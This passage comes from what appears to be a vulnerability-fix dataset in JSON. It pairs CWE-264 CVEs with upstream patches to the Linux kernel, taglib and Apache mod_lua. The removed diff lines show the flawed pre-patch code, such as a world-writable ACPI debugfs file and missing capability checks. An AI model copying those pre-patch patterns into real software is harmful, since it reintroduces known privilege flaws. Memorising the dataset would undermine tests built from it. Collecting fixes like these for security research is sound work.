1.2-0.3.lf.el7\n\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2010-0291","CWE_ID":"264","category":"security","commit_id":"f106af4e90eadd76cfc0b5325f659619e08fb762","commit_message":"From f106af4e90eadd76cfc0b5325f659619e08fb762 Mon Sep 17 00:00:00 2001\nFrom: Al Viro <viro@zeniv.linux.org.uk>\nDate: Tue, 24 Nov 2009 08:25:18 -0500\nSubject: fix checks for expand-in-place mremap\n\nAcked-by: Russell King <rmk+kernel@arm.linux.org.uk>\nSigned-off-by: Al Viro <viro@zeniv.linux.org.uk>\n---\n mm\/mremap.c | 13 +++++++++++--\n 1 file changed, 11 insertions(+), 2 deletions(-)\n\n","diff_code":"diff --git a\/mm\/mremap.c b\/mm\/mremap.c\nindex 90e422c9f410..9d0753983dcb 100644\n--- a\/mm\/mremap.c\n+++ b\/mm\/mremap.c\n@@ -27,6 +27,10 @@\n \n #include \"internal.h\"\n \n+#ifndef arch_mmap_check\n+#define arch_mmap_check(addr, len, flags)\t(0)\n+#endif\n+\n static pmd_t *get_old_pmd(struct mm_struct *mm, unsigned long addr)\n {\n \tpgd_t *pgd;\n@@ -368,12 +372,17 @@ out:\n \n static int vma_expandable(struct vm_area_struct *vma, unsigned long delta)\n {\n+\tunsigned long end = vma->vm_end + delta;\n \tunsigned long max_addr = TASK_SIZE;\n \tif (vma->vm_next)\n \t\tmax_addr = vma->vm_next->vm_start;\n-\tif (max_addr - vma->vm_end < delta)\n+\tif (max_addr < end || end < vma->vm_end)\n+\t\treturn 0;\n+\tif (arch_mmap_check(vma->vm_start, end - vma->vm_start, MAP_FIXED))\n+\t\treturn 0;\n+\tif (get_unmapped_area(NULL, vma->vm_start, end - vma->vm_start,\n+\t\t\t      0, MAP_FIXED) & ~PAGE_MASK)\n \t\treturn 0;\n-\t\/* we need to do arch-specific checks here *\/\n \treturn 1;\n }\n \n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2009-3722","CWE_ID":"264","category":"security","commit_id":"0a79b009525b160081d75cef5dbf45817956acf2","commit_message":"From 0a79b009525b160081d75cef5dbf45817956acf2 Mon Sep 17 00:00:00 2001\nFrom: Avi Kivity <avi@redhat.com>\nDate: Tue, 1 Sep 2009 12:03:25 +0300\nSubject: KVM: VMX: Check cpl before emulating debug register access\n\nDebug registers may only be accessed from cpl 0.  Unfortunately, vmx will\ncode to emulate the instruction even though it was issued from guest\nuserspace, possibly leading to an unexpected trap later.\n\nCc: stable@kernel.org\nSigned-off-by: Avi Kivity <avi@redhat.com>\nSigned-off-by: Marcelo Tosatti <mtosatti@redhat.com>\n---\n arch\/x86\/include\/asm\/kvm_host.h |  1 +\n arch\/x86\/kvm\/vmx.c              |  2 ++\n arch\/x86\/kvm\/x86.c              | 13 +++++++++++++\n 3 files changed, 16 insertions(+)\n\n","diff_code":"diff --git a\/arch\/x86\/include\/asm\/kvm_host.h b\/arch\/x86\/include\/asm\/kvm_host.h\nindex e8f166a02c79..3be000435fad 100644\n--- a\/arch\/x86\/include\/asm\/kvm_host.h\n+++ b\/arch\/x86\/include\/asm\/kvm_host.h\n@@ -620,6 +620,7 @@ void kvm_queue_exception(struct kvm_vcpu *vcpu, unsigned nr);\n void kvm_queue_exception_e(struct kvm_vcpu *vcpu, unsigned nr, u32 error_code);\n void kvm_inject_page_fault(struct kvm_vcpu *vcpu, unsigned long cr2,\n \t\t\t   u32 error_code);\n+bool kvm_require_cpl(struct kvm_vcpu *vcpu, int required_cpl);\n \n int kvm_pic_set_irq(void *opaque, int irq, int level);\n \ndiff --git a\/arch\/x86\/kvm\/vmx.c b\/arch\/x86\/kvm\/vmx.c\nindex cc6e00a9f724..f3812014bd0b 100644\n--- a\/arch\/x86\/kvm\/vmx.c\n+++ b\/arch\/x86\/kvm\/vmx.c\n@@ -2934,6 +2934,8 @@ static int handle_dr(struct kvm_vcpu *vcpu, struct kvm_run *kvm_run)\n \tunsigned long val;\n \tint dr, reg;\n \n+\tif (!kvm_require_cpl(vcpu, 0))\n+\t\treturn 1;\n \tdr = vmcs_readl(GUEST_DR7);\n \tif (dr & DR7_GD) {\n \t\t\/*\ndiff --git a\/arch\/x86\/kvm\/x86.c b\/arch\/x86\/kvm\/x86.c\nindex 7627ff607a90..4137cc579ba5 100644\n--- a\/arch\/x86\/kvm\/x86.c\n+++ b\/arch\/x86\/kvm\/x86.c\n@@ -222,6 +222,19 @@ void kvm_queue_exception_e(struct kvm_vcpu *vcpu, unsigned nr, u32 error_code)\n }\n EXPORT_SYMBOL_GPL(kvm_queue_exception_e);\n \n+\/*\n+ * Checks if cpl <= required_cpl; if true, return true.  Otherwise queue\n+ * a #GP and return false.\n+ *\/\n+bool kvm_require_cpl(struct kvm_vcpu *vcpu, int required_cpl)\n+{\n+\tif (kvm_x86_ops->get_cpl(vcpu) <= required_cpl)\n+\t\treturn true;\n+\tkvm_queue_exception_e(vcpu, GP_VECTOR, 0);\n+\treturn false;\n+}\n+EXPORT_SYMBOL_GPL(kvm_require_cpl);\n+\n \/*\n  * Load the pae pdptrs.  Return true is they are all valid.\n  *\/\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"mjg59","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2010-4347","CWE_ID":"264","category":"security","commit_id":"ed3aada1bf34c5a9e98af167f125f8a740fc726a","commit_message":"From ed3aada1bf34c5a9e98af167f125f8a740fc726a Mon Sep 17 00:00:00 2001\nFrom: Dave Jones <davej@redhat.com>\nDate: Sat, 13 Nov 2010 00:58:54 -0500\nSubject: ACPI: debugfs custom_method open to non-root\n\nCurrently we have:\n\n  --w--w--w-. 1 root root 0 2010-11-11 14:56 \/sys\/kernel\/debug\/acpi\/custom_method\n\nwhich is just crazy. Change this to --w-------.\n\nSigned-off-by: Dave Jones <davej@redhat.com>\nSigned-off-by: Len Brown <len.brown@intel.com>\nCc: stable@kernel.org (for 2.6.36)\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>\n---\n drivers\/acpi\/debugfs.c | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/drivers\/acpi\/debugfs.c b\/drivers\/acpi\/debugfs.c\nindex 6355b575ee5a..5df67f1d6c61 100644\n--- a\/drivers\/acpi\/debugfs.c\n+++ b\/drivers\/acpi\/debugfs.c\n@@ -80,7 +80,7 @@ int __init acpi_debugfs_init(void)\n \tif (!acpi_dir)\n \t\tgoto err;\n \n-\tcm_dentry = debugfs_create_file(\"custom_method\", S_IWUGO,\n+\tcm_dentry = debugfs_create_file(\"custom_method\", S_IWUSR,\n \t\t\t\t\tacpi_dir, NULL, &cm_fops);\n \tif (!cm_dentry)\n \t\tgoto err;\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2014-9585","CWE_ID":"264","category":"security","commit_id":"394f56fe480140877304d342dec46d50dc823d46","commit_message":"From 394f56fe480140877304d342dec46d50dc823d46 Mon Sep 17 00:00:00 2001\nFrom: Andy Lutomirski <luto@amacapital.net>\nDate: Fri, 19 Dec 2014 16:04:11 -0800\nSubject: x86_64, vdso: Fix the vdso address randomization algorithm\n\nThe theory behind vdso randomization is that it's mapped at a random\noffset above the top of the stack.  To avoid wasting a page of\nmemory for an extra page table, the vdso isn't supposed to extend\npast the lowest PMD into which it can fit.  Other than that, the\naddress should be a uniformly distributed address that meets all of\nthe alignment requirements.\n\nThe current algorithm is buggy: the vdso has about a 50% probability\nof being at the very end of a PMD.  The current algorithm also has a\ndecent chance of failing outright due to incorrect handling of the\ncase where the top of the stack is near the top of its PMD.\n\nThis fixes the implementation.  The paxtest estimate of vdso\n\"randomisation\" improves from 11 bits to 18 bits.  (Disclaimer: I\ndon't know what the paxtest code is actually calculating.)\n\nIt's worth noting that this algorithm is inherently biased: the vdso\nis more likely to end up near the end of its PMD than near the\nbeginning.  Ideally we would either nix the PMD sharing requirement\nor jointly randomize the vdso and the stack to reduce the bias.\n\nIn the mean time, this is a considerable improvement with basically\nno risk of compatibility issues, since the allowed outputs of the\nalgorithm are unchanged.\n\nAs an easy test, doing this:\n\nfor i in `seq 10000`\n  do grep -P vdso \/proc\/self\/maps |cut -d- -f1\ndone |sort |uniq -d\n\nused to produce lots of output (1445 lines on my most recent run).\nA tiny subset looks like this:\n\n7fffdfffe000\n7fffe01fe000\n7fffe05fe000\n7fffe07fe000\n7fffe09fe000\n7fffe0bfe000\n7fffe0dfe000\n\nNote the suspicious fe000 endings.  With the fix, I get a much more\npalatable 76 repeated addresses.\n\nReviewed-by: Kees Cook <keescook@chromium.org>\nCc: stable@vger.kernel.org\nSigned-off-by: Andy Lutomirski <luto@amacapital.net>\n---\n arch\/x86\/vdso\/vma.c | 45 +++++++++++++++++++++++++++++----------------\n 1 file changed, 29 insertions(+), 16 deletions(-)\n\n","diff_code":"diff --git a\/arch\/x86\/vdso\/vma.c b\/arch\/x86\/vdso\/vma.c\nindex 009495b9ab4b..1c9f750c3859 100644\n--- a\/arch\/x86\/vdso\/vma.c\n+++ b\/arch\/x86\/vdso\/vma.c\n@@ -41,12 +41,17 @@ void __init init_vdso_image(const struct vdso_image *image)\n \n struct linux_binprm;\n \n-\/* Put the vdso above the (randomized) stack with another randomized offset.\n-   This way there is no hole in the middle of address space.\n-   To save memory make sure it is still in the same PTE as the stack top.\n-   This doesn't give that many random bits.\n-\n-   Only used for the 64-bit and x32 vdsos. *\/\n+\/*\n+ * Put the vdso above the (randomized) stack with another randomized\n+ * offset.  This way there is no hole in the middle of address space.\n+ * To save memory make sure it is still in the same PTE as the stack\n+ * top.  This doesn't give that many random bits.\n+ *\n+ * Note that this algorithm is imperfect: the distribution of the vdso\n+ * start address within a PMD is biased toward the end.\n+ *\n+ * Only used for the 64-bit and x32 vdsos.\n+ *\/\n static unsigned long vdso_addr(unsigned long start, unsigned len)\n {\n #ifdef CONFIG_X86_32\n@@ -54,22 +59,30 @@ static unsigned long vdso_addr(unsigned long start, unsigned len)\n #else\n \tunsigned long addr, end;\n \tunsigned offset;\n-\tend = (start + PMD_SIZE - 1) & PMD_MASK;\n+\n+\t\/*\n+\t * Round up the start address.  It can start out unaligned as a result\n+\t * of stack start randomization.\n+\t *\/\n+\tstart = PAGE_ALIGN(start);\n+\n+\t\/* Round the lowest possible end address up to a PMD boundary. *\/\n+\tend = (start + len + PMD_SIZE - 1) & PMD_MASK;\n \tif (end >= TASK_SIZE_MAX)\n \t\tend = TASK_SIZE_MAX;\n \tend -= len;\n-\t\/* This loses some more bits than a modulo, but is cheaper *\/\n-\toffset = get_random_int() & (PTRS_PER_PTE - 1);\n-\taddr = start + (offset << PAGE_SHIFT);\n-\tif (addr >= end)\n-\t\taddr = end;\n+\n+\tif (end > start) {\n+\t\toffset = get_random_int() % (((end - start) >> PAGE_SHIFT) + 1);\n+\t\taddr = start + (offset << PAGE_SHIFT);\n+\t} else {\n+\t\taddr = start;\n+\t}\n \n \t\/*\n-\t * page-align it here so that get_unmapped_area doesn't\n-\t * align it wrongfully again to the next page. addr can come in 4K\n-\t * unaligned here as a result of stack start randomization.\n+\t * Forcibly align the final address in case we have a hardware\n+\t * issue that requires alignment for performance reasons.\n \t *\/\n-\taddr = PAGE_ALIGN(addr);\n \taddr = align_vdso_addr(addr);\n \n \treturn addr;\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2015-8660","CWE_ID":"264","category":"security","commit_id":"acff81ec2c79492b180fade3c2894425cd35a545","commit_message":"From acff81ec2c79492b180fade3c2894425cd35a545 Mon Sep 17 00:00:00 2001\nFrom: Miklos Szeredi <miklos@szeredi.hu>\nDate: Fri, 4 Dec 2015 19:18:48 +0100\nSubject: ovl: fix permission checking for setattr\n\n[Al Viro] The bug is in being too enthusiastic about optimizing ->setattr()\naway - instead of \"copy verbatim with metadata\" + \"chmod\/chown\/utimes\"\n(with the former being always safe and the latter failing in case of\ninsufficient permissions) it tries to combine these two.  Note that copyup\nitself will have to do ->setattr() anyway; _that_ is where the elevated\ncapabilities are right.  Having these two ->setattr() (one to set verbatim\ncopy of metadata, another to do what overlayfs ->setattr() had been asked\nto do in the first place) combined is where it breaks.\n\nSigned-off-by: Miklos Szeredi <miklos@szeredi.hu>\nCc: <stable@vger.kernel.org>\nSigned-off-by: Al Viro <viro@zeniv.linux.org.uk>\n---\n fs\/overlayfs\/inode.c | 8 ++++----\n 1 file changed, 4 insertions(+), 4 deletions(-)\n\n","diff_code":"diff --git a\/fs\/overlayfs\/inode.c b\/fs\/overlayfs\/inode.c\nindex ec0c2a050043..961284936917 100644\n--- a\/fs\/overlayfs\/inode.c\n+++ b\/fs\/overlayfs\/inode.c\n@@ -49,13 +49,13 @@ int ovl_setattr(struct dentry *dentry, struct iattr *attr)\n \tif (err)\n \t\tgoto out;\n \n-\tupperdentry = ovl_dentry_upper(dentry);\n-\tif (upperdentry) {\n+\terr = ovl_copy_up(dentry);\n+\tif (!err) {\n+\t\tupperdentry = ovl_dentry_upper(dentry);\n+\n \t\tmutex_lock(&upperdentry->d_inode->i_mutex);\n \t\terr = notify_change(upperdentry, attr, NULL);\n \t\tmutex_unlock(&upperdentry->d_inode->i_mutex);\n-\t} else {\n-\t\terr = ovl_copy_up_last(dentry, attr, false);\n \t}\n \tovl_drop_write(dentry);\n out:\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2017-12678","CWE_ID":"264","category":"security","commit_id":"eb9ded1206f18f2c319157337edea2533a40bea6","commit_message":"From eb9ded1206f18f2c319157337edea2533a40bea6 Mon Sep 17 00:00:00 2001\nFrom: \"Stephen F. Booth\" <me@sbooth.org>\nDate: Sun, 23 Jul 2017 10:11:09 -0400\nSubject: [PATCH] Don't assume TDRC is an instance of TextIdentificationFrame\n\nIf TDRC is encrypted, FrameFactory::createFrame() returns UnknownFrame\nwhich causes problems in rebuildAggregateFrames() when it is assumed\nthat TDRC is a TextIdentificationFrame\n---\n taglib\/mpeg\/id3v2\/id3v2framefactory.cpp | 5 +++--\n 1 file changed, 3 insertions(+), 2 deletions(-)\n\n","diff_code":"diff --git a\/taglib\/mpeg\/id3v2\/id3v2framefactory.cpp b\/taglib\/mpeg\/id3v2\/id3v2framefactory.cpp\nindex 759a9b7be..9347ab869 100644\n--- a\/taglib\/mpeg\/id3v2\/id3v2framefactory.cpp\n+++ b\/taglib\/mpeg\/id3v2\/id3v2framefactory.cpp\n@@ -334,10 +334,11 @@ void FrameFactory::rebuildAggregateFrames(ID3v2::Tag *tag) const\n      tag->frameList(\"TDAT\").size() == 1)\n   {\n     TextIdentificationFrame *tdrc =\n-      static_cast<TextIdentificationFrame *>(tag->frameList(\"TDRC\").front());\n+      dynamic_cast<TextIdentificationFrame *>(tag->frameList(\"TDRC\").front());\n     UnknownFrame *tdat = static_cast<UnknownFrame *>(tag->frameList(\"TDAT\").front());\n \n-    if(tdrc->fieldList().size() == 1 &&\n+    if(tdrc &&\n+       tdrc->fieldList().size() == 1 &&\n        tdrc->fieldList().front().size() == 4 &&\n        tdat->data().size() >= 5)\n     {\n","owner":"taglib","repo":"taglib","source":"cve"},{"CVE_ID":"CVE-2008-3525","CWE_ID":"264","category":"security","commit_id":"f2455eb176ac87081bbfc9a44b21c7cd2bc1967e","commit_message":"From f2455eb176ac87081bbfc9a44b21c7cd2bc1967e Mon Sep 17 00:00:00 2001\nFrom: Eugene Teo <eugeneteo@kernel.sg>\nDate: Wed, 27 Aug 2008 04:50:30 -0700\nSubject: wan: Missing capability checks in sbni_ioctl()\n\nThere are missing capability checks in the following code:\n\n1300 static int\n1301 sbni_ioctl( struct net_device  *dev,  struct ifreq  *ifr,  int  cmd)\n1302 {\n[...]\n1319     case  SIOCDEVRESINSTATS :\n1320         if( current->euid != 0 )    \/* root only *\/\n1321             return  -EPERM;\n[...]\n1336     case  SIOCDEVSHWSTATE :\n1337         if( current->euid != 0 )    \/* root only *\/\n1338             return  -EPERM;\n[...]\n1357     case  SIOCDEVENSLAVE :\n1358         if( current->euid != 0 )    \/* root only *\/\n1359             return  -EPERM;\n[...]\n1372     case  SIOCDEVEMANSIPATE :\n1373         if( current->euid != 0 )    \/* root only *\/\n1374             return  -EPERM;\n\nHere's my proposed fix:\n\nMissing capability checks.\n\nSigned-off-by: Eugene Teo <eugeneteo@kernel.sg>\nSigned-off-by: David S. Miller <davem@davemloft.net>\n---\n drivers\/net\/wan\/sbni.c | 8 ++++----\n 1 file changed, 4 insertions(+), 4 deletions(-)\n\n","diff_code":"diff --git a\/drivers\/net\/wan\/sbni.c b\/drivers\/net\/wan\/sbni.c\nindex e59255a155a9..6596cd0742b9 100644\n--- a\/drivers\/net\/wan\/sbni.c\n+++ b\/drivers\/net\/wan\/sbni.c\n@@ -1317,7 +1317,7 @@ sbni_ioctl( struct net_device  *dev,  struct ifreq  *ifr,  int  cmd )\n \t\tbreak;\n \n \tcase  SIOCDEVRESINSTATS :\n-\t\tif( current->euid != 0 )\t\/* root only *\/\n+\t\tif (!capable(CAP_NET_ADMIN))\n \t\t\treturn  -EPERM;\n \t\tmemset( &nl->in_stats, 0, sizeof(struct sbni_in_stats) );\n \t\tbreak;\n@@ -1334,7 +1334,7 @@ sbni_ioctl( struct net_device  *dev,  struct ifreq  *ifr,  int  cmd )\n \t\tbreak;\n \n \tcase  SIOCDEVSHWSTATE :\n-\t\tif( current->euid != 0 )\t\/* root only *\/\n+\t\tif (!capable(CAP_NET_ADMIN))\n \t\t\treturn  -EPERM;\n \n \t\tspin_lock( &nl->lock );\n@@ -1355,7 +1355,7 @@ sbni_ioctl( struct net_device  *dev,  struct ifreq  *ifr,  int  cmd )\n #ifdef CONFIG_SBNI_MULTILINE\n \n \tcase  SIOCDEVENSLAVE :\n-\t\tif( current->euid != 0 )\t\/* root only *\/\n+\t\tif (!capable(CAP_NET_ADMIN))\n \t\t\treturn  -EPERM;\n \n \t\tif (copy_from_user( slave_name, ifr->ifr_data, sizeof slave_name ))\n@@ -1370,7 +1370,7 @@ sbni_ioctl( struct net_device  *dev,  struct ifreq  *ifr,  int  cmd )\n \t\treturn  enslave( dev, slave_dev );\n \n \tcase  SIOCDEVEMANSIPATE :\n-\t\tif( current->euid != 0 )\t\/* root only *\/\n+\t\tif (!capable(CAP_NET_ADMIN))\n \t\t\treturn  -EPERM;\n \n \t\treturn  emancipate( dev );\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"stoth68000","repo":"media-tree","source":"cve"},{"CVE_ID":"CVE-2017-2583","CWE_ID":"264","category":"security","commit_id":"33ab91103b3415e12457e3104f0e4517ce12d0f3","commit_message":"From 33ab91103b3415e12457e3104f0e4517ce12d0f3 Mon Sep 17 00:00:00 2001\nFrom: Paolo Bonzini <pbonzini@redhat.com>\nDate: Thu, 12 Jan 2017 15:02:32 +0100\nSubject: [PATCH] KVM: x86: fix emulation of \"MOV SS, null selector\"\n\nThis is CVE-2017-2583.  On Intel this causes a failed vmentry because\nSS's type is neither 3 nor 7 (even though the manual says this check is\nonly done for usable SS, and the dmesg splat says that SS is unusable!).\nOn AMD it's worse: svm.c is confused and sets CPL to 0 in the vmcb.\n\nThe fix fabricates a data segment descriptor when SS is set to a null\nselector, so that CPL and SS.DPL are set correctly in the VMCS\/vmcb.\nFurthermore, only allow setting SS to a NULL selector if SS.RPL < 3;\nthis in turn ensures CPL < 3 because RPL must be equal to CPL.\n\nThanks to Andy Lutomirski and Willy Tarreau for help in analyzing\nthe bug and deciphering the manuals.\n\nReported-by: Xiaohan Zhang <zhangxiaohan1@huawei.com>\nFixes: 79d5b4c3cd809c770d4bf9812635647016c56011\nCc: stable@nongnu.org\nSigned-off-by: Paolo Bonzini <pbonzini@redhat.com>\n---\n arch\/x86\/kvm\/emulate.c | 48 +++++++++++++++++++++++++++++++++---------\n 1 file changed, 38 insertions(+), 10 deletions(-)\n\n","diff_code":"diff --git a\/arch\/x86\/kvm\/emulate.c b\/arch\/x86\/kvm\/emulate.c\nindex f36d0fa6b8854..cedbba0f3402d 100644\n--- a\/arch\/x86\/kvm\/emulate.c\n+++ b\/arch\/x86\/kvm\/emulate.c\n@@ -1585,7 +1585,6 @@ static int write_segment_descriptor(struct x86_emulate_ctxt *ctxt,\n \t\t\t\t    &ctxt->exception);\n }\n \n-\/* Does not support long mode *\/\n static int __load_segment_descriptor(struct x86_emulate_ctxt *ctxt,\n \t\t\t\t     u16 selector, int seg, u8 cpl,\n \t\t\t\t     enum x86_transfer_type transfer,\n@@ -1622,20 +1621,34 @@ static int __load_segment_descriptor(struct x86_emulate_ctxt *ctxt,\n \n \trpl = selector & 3;\n \n-\t\/* NULL selector is not valid for TR, CS and SS (except for long mode) *\/\n-\tif ((seg == VCPU_SREG_CS\n-\t     || (seg == VCPU_SREG_SS\n-\t\t && (ctxt->mode != X86EMUL_MODE_PROT64 || rpl != cpl))\n-\t     || seg == VCPU_SREG_TR)\n-\t    && null_selector)\n-\t\tgoto exception;\n-\n \t\/* TR should be in GDT only *\/\n \tif (seg == VCPU_SREG_TR && (selector & (1 << 2)))\n \t\tgoto exception;\n \n-\tif (null_selector) \/* for NULL selector skip all following checks *\/\n+\t\/* NULL selector is not valid for TR, CS and (except for long mode) SS *\/\n+\tif (null_selector) {\n+\t\tif (seg == VCPU_SREG_CS || seg == VCPU_SREG_TR)\n+\t\t\tgoto exception;\n+\n+\t\tif (seg == VCPU_SREG_SS) {\n+\t\t\tif (ctxt->mode != X86EMUL_MODE_PROT64 || rpl != cpl)\n+\t\t\t\tgoto exception;\n+\n+\t\t\t\/*\n+\t\t\t * ctxt->ops->set_segment expects the CPL to be in\n+\t\t\t * SS.DPL, so fake an expand-up 32-bit data segment.\n+\t\t\t *\/\n+\t\t\tseg_desc.type = 3;\n+\t\t\tseg_desc.p = 1;\n+\t\t\tseg_desc.s = 1;\n+\t\t\tseg_desc.dpl = cpl;\n+\t\t\tseg_desc.d = 1;\n+\t\t\tseg_desc.g = 1;\n+\t\t}\n+\n+\t\t\/* Skip all following checks *\/\n \t\tgoto load;\n+\t}\n \n \tret = read_segment_descriptor(ctxt, selector, &seg_desc, &desc_addr);\n \tif (ret != X86EMUL_CONTINUE)\n@@ -1751,6 +1764,21 @@ static int load_segment_descriptor(struct x86_emulate_ctxt *ctxt,\n \t\t\t\t   u16 selector, int seg)\n {\n \tu8 cpl = ctxt->ops->cpl(ctxt);\n+\n+\t\/*\n+\t * None of MOV, POP and LSS can load a NULL selector in CPL=3, but\n+\t * they can load it at CPL<3 (Intel's manual says only LSS can,\n+\t * but it's wrong).\n+\t *\n+\t * However, the Intel manual says that putting IST=1\/DPL=3 in\n+\t * an interrupt gate will result in SS=3 (the AMD manual instead\n+\t * says it doesn't), so allow SS=3 in __load_segment_descriptor\n+\t * and only forbid it here.\n+\t *\/\n+\tif (seg == VCPU_SREG_SS && selector == 3 &&\n+\t    ctxt->mode == X86EMUL_MODE_PROT64)\n+\t\treturn emulate_exception(ctxt, GP_VECTOR, 0, true);\n+\n \treturn __load_segment_descriptor(ctxt, selector, seg, cpl,\n \t\t\t\t\t X86_TRANSFER_NONE, NULL);\n }\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2014-8109","CWE_ID":"264","category":"security","commit_id":"3f1693d558d0758f829c8b53993f1749ddf6ffcb","commit_message":"From 3f1693d558d0758f829c8b53993f1749ddf6ffcb Mon Sep 17 00:00:00 2001\nFrom: Jim Jagielski <jim@apache.org>\nDate: Tue, 2 Dec 2014 12:50:59 +0000\nSubject: [PATCH] Merge r1642499 from trunk:\n\n  *) SECURITY: CVE-2014-8109 (cve.mitre.org)\n     mod_lua: Fix handling of the Require line when a LuaAuthzProvider is\n     used in multiple Require directives with different arguments.\n     PR57204 [Edward Lu <Chaosed0 gmail.com>]\n\nSubmitted By: Edward Lu\nCommitted By: covener\n\n\nSubmitted by: covener\nReviewed\/backported by: jim\n\n\ngit-svn-id: https:\/\/svn.apache.org\/repos\/asf\/httpd\/httpd\/branches\/2.4.x@1642861 13f79535-47bb-0310-9956-ffa450edef68\n---\n CHANGES               |  5 +++++\n STATUS                |  7 -------\n modules\/lua\/mod_lua.c | 27 +++++++++++++++++----------\n 3 files changed, 22 insertions(+), 17 deletions(-)\n\n","diff_code":"diff --git a\/CHANGES b\/CHANGES\nindex 9c0315453ee..f770724b69a 100644\n--- a\/CHANGES\n+++ b\/CHANGES\n@@ -10,6 +10,11 @@ Changes with Apache 2.4.11\n      mod_cache: Avoid a crash when Content-Type has an empty value.\n      PR 56924.  [Mark Montague <mark catseye.org>, Jan Kaluza]\n \n+  *) SECURITY: CVE-2014-8109 (cve.mitre.org)\n+     mod_lua: Fix handling of the Require line when a LuaAuthzProvider is\n+     used in multiple Require directives with different arguments.\n+     PR57204 [Edward Lu <Chaosed0 gmail.com>]\n+\n   *) SECURITY: CVE-2013-5704 (cve.mitre.org)\n      core: HTTP trailers could be used to replace HTTP headers\n      late during request processing, potentially undoing or\ndiff --git a\/STATUS b\/STATUS\nindex 211dd42c02e..4d2149708e8 100644\n--- a\/STATUS\n+++ b\/STATUS\n@@ -104,13 +104,6 @@ RELEASE SHOWSTOPPERS:\n PATCHES ACCEPTED TO BACKPORT FROM TRUNK:\n   [ start all new proposals below, under PATCHES PROPOSED. ]\n \n-  *) SECURITY: CVE-2014-8109 (cve.mitre.org)\n-     mod_lua: Fix handling of the Require line when a LuaAuthzProvider is\n-              used in multiple Require directives with different arguments.\n-              PR57204. \n-     trunk patch: http:\/\/svn.apache.org\/r1642499\n-     2.4.x patch: trunk works:\n-     +1 covener, ylavic, jim\n \n \n PATCHES PROPOSED TO BACKPORT FROM TRUNK:\ndiff --git a\/modules\/lua\/mod_lua.c b\/modules\/lua\/mod_lua.c\nindex b2dca7548de..e6d2cfcc343 100644\n--- a\/modules\/lua\/mod_lua.c\n+++ b\/modules\/lua\/mod_lua.c\n@@ -66,9 +66,13 @@ typedef struct {\n     const char *file_name;\n     const char *function_name;\n     ap_lua_vm_spec *spec;\n-    apr_array_header_t *args;\n } lua_authz_provider_spec;\n \n+typedef struct {\n+    lua_authz_provider_spec *spec;\n+    apr_array_header_t *args;\n+} lua_authz_provider_func;\n+\n apr_hash_t *lua_authz_providers;\n \n typedef struct\n@@ -1692,6 +1696,7 @@ static const char *lua_authz_parse(cmd_parms *cmd, const char *require_line,\n {\n     const char *provider_name;\n     lua_authz_provider_spec *spec;\n+    lua_authz_provider_func *func = apr_pcalloc(cmd->pool, sizeof(lua_authz_provider_func));\n \n     apr_pool_userdata_get((void**)&provider_name, AUTHZ_PROVIDER_NAME_NOTE,\n                           cmd->temp_pool);\n@@ -1699,16 +1704,17 @@ static const char *lua_authz_parse(cmd_parms *cmd, const char *require_line,\n \n     spec = apr_hash_get(lua_authz_providers, provider_name, APR_HASH_KEY_STRING);\n     ap_assert(spec != NULL);\n+    func->spec = spec;\n \n     if (require_line && *require_line) {\n         const char *arg;\n-        spec->args = apr_array_make(cmd->pool, 2, sizeof(const char *));\n+        func->args = apr_array_make(cmd->pool, 2, sizeof(const char *));\n         while ((arg = ap_getword_conf(cmd->pool, &require_line)) && *arg) {\n-            APR_ARRAY_PUSH(spec->args, const char *) = arg;\n+            APR_ARRAY_PUSH(func->args, const char *) = arg;\n         }\n     }\n \n-    *parsed_require_line = spec;\n+    *parsed_require_line = func;\n     return NULL;\n }\n \n@@ -1722,7 +1728,8 @@ static authz_status lua_authz_check(request_rec *r, const char *require_line,\n                                                          &lua_module);\n     const ap_lua_dir_cfg *cfg = ap_get_module_config(r->per_dir_config,\n                                                      &lua_module);\n-    const lua_authz_provider_spec *prov_spec = parsed_require_line;\n+    const lua_authz_provider_func *prov_func = parsed_require_line;\n+    const lua_authz_provider_spec *prov_spec = prov_func->spec;\n     int result;\n     int nargs = 0;\n \n@@ -1744,19 +1751,19 @@ static authz_status lua_authz_check(request_rec *r, const char *require_line,\n         return AUTHZ_GENERAL_ERROR;\n     }\n     ap_lua_run_lua_request(L, r);\n-    if (prov_spec->args) {\n+    if (prov_func->args) {\n         int i;\n-        if (!lua_checkstack(L, prov_spec->args->nelts)) {\n+        if (!lua_checkstack(L, prov_func->args->nelts)) {\n             ap_log_rerror(APLOG_MARK, APLOG_ERR, 0, r, APLOGNO(02315)\n                           \"Error: authz provider %s: too many arguments\", prov_spec->name);\n             ap_lua_release_state(L, spec, r);\n             return AUTHZ_GENERAL_ERROR;\n         }\n-        for (i = 0; i < prov_spec->args->nelts; i++) {\n-            const char *arg = APR_ARRAY_IDX(prov_spec->args, i, const char *);\n+        for (i = 0; i < prov_func->args->nelts; i++) {\n+            const char *arg = APR_ARRAY_IDX(prov_func->args, i, const char *);\n             lua_pushstring(L, arg);\n         }\n-        nargs = prov_spec->args->nelts;\n+        nargs = prov_func->args->nelts;\n     }\n     if (lua_pcall(L, 1 + nargs, 1, 0)) {\n         const char *err = lua_tostring(L, -1);\n","owner":"apache","repo":"httpd","source":"cve"},{"CVE_ID":"CVE-2010-0291","CWE_ID":"264","category":"security","commit_id":"e77414e0aad6a1b063ba5e5750c582c75327ea6a","commit_message":"From e77414e0aad6a1b063ba5e5750c582c75327ea6a Mon Sep 17 00:00:00 2001\nFrom: Al Viro <viro@zeniv.linux.org.uk>\nDate: Sat, 5 Dec 2009 15:10:44 -0500\nSubject: fix broken aliasing checks for MAP_FIXED on sparc32, mips, arm and sh\n\nWe want addr - (pgoff << PAGE_SHIFT) consistently coloured...\n\nAcked-by: Paul Mundt <lethal@linux-sh.org>\nAcked-by: Hugh Dickins 